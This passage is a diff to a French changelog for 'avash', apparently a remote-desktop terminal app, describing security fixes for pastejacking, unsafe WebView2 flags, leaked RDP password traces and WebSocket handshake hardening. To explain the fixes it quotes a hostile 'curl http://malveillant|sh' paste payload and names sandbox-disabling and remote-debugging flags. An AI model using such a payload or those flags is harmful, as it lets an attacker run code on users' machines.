@@ -17,9 +17,53 @@ et le projet suit le [versionnage sémantique](https://semver.org/lang/fr/).
   indique une session distante, avash bascule la composition de WebView2 en
   logiciel (`--disable-gpu-compositing`) — exactement l'analogue du
   `WEBKIT_DISABLE_COMPOSITING_MODE` déjà posé sous Linux. Aucun effet sur un
-  écran physique, où le GPU sert normalement. La variable
-  `WEBVIEW2_ADDITIONAL_BROWSER_ARGUMENTS` reste prioritaire pour qui veut
-  trancher à la main.
+  écran physique, où le GPU sert normalement. Une valeur
+  `WEBVIEW2_ADDITIONAL_BROWSER_ARGUMENTS` déjà posée est respectée pour le
+  compositing, mais expurgée de ses drapeaux sensibles (voir ci-dessous).
+
+### Sécurité
+
+- **Le collage applicatif passe enfin par le « bracketed paste ».** Ctrl+Maj+V
+  et « Coller » du menu écrivaient les octets bruts du presse-papiers dans le
+  terminal distant, court-circuitant l'encadrement `ESC[200~…ESC[201~` que le
+  shell distant demande. Une page web piégée pouvait ainsi déposer
+  `commande\ncurl http://malveillant|sh\n` dans le presse-papiers et faire
+  exécuter la seconde ligne à l'insu de l'utilisateur (pastejacking). Le collage
+  passe désormais par `term.paste()`, qui applique l'encadrement, et tout
+  collage multi-ligne demande confirmation.
+- **Les drapeaux WebView2 dangereux hérités de l'environnement sont retirés.**
+  `--remote-debugging-port`, `--no-sandbox`, `--disable-web-security` et
+  consorts, posés dans `WEBVIEW2_ADDITIONAL_BROWSER_ARGUMENTS`, arment un
+  débogueur distant ou désactivent le bac à sable de la webview — un pied local
+  en ferait un pivot. avash les expurge avant de démarrer. Symétriquement, sous
+  Linux, un `WEBKIT_INSPECTOR_SERVER` hérité est neutralisé.
+- **Les traces `AVASH_RDP_TRACE` ne remontent plus à l'interface.** Elles
+  portent le mot de passe en clair (CredSSP) ; depuis le journal de diagnostic,
+  l'interface captait `stderr` et l'affichait dans l'incrustation de fermeture —
+  le secret pouvait partir dans une capture d'écran jointe à un rapport de bug.
+  Elles vont maintenant dans un fichier dédié en `0600`, dont seul le chemin est
+  annoncé.
+- **Poignée de main WebSocket du processus RDP durcie.** Chaque validation se
+  fait désormais dans sa propre tâche (un client muet ne bloque plus la file —
+  c'était un déni de service par une page web ou un processus local), l'origine
+  est vérifiée (une page web réelle est refusée, la webview passe), et le jeton
+  est comparé en temps constant.
+- **La chaîne d'intégration ferme trois portes de plus.** `cargo deny check
+  advisories` est enfin appelé (la section `[advisories]` ne servait à rien),
+  `cargo audit` échoue désormais sur les défauts de sûreté (`--deny unsound`),
+  `npm audit` couvre le front (le vrai périmètre de confiance), et le code
+  spécifique Windows de l'interface est compilé et testé en CI au lieu de ne
+  l'être qu'à la publication.
+
+### Performance
+
+- **Moins d'allocations sur le chemin chaud du décodage graphique.** Le message
+  multi-rectangles réserve sa capacité d'avance (fini le doublement d'un tampon
+  multi-mégaoctets, image après image), la conversion BGRA→RGBA aussi, et le
+  drapeau de trace n'est plus relu de l'environnement à chaque PDU. Côté
+  interface, le rectangle du canvas n'est plus recalculé à chaque mouvement de
+  souris (un reflow forcé jusqu'à mille fois par seconde), mais mémorisé et
+  invalidé au besoin.
 
 ## [0.6.0] - 2026-09-01
 
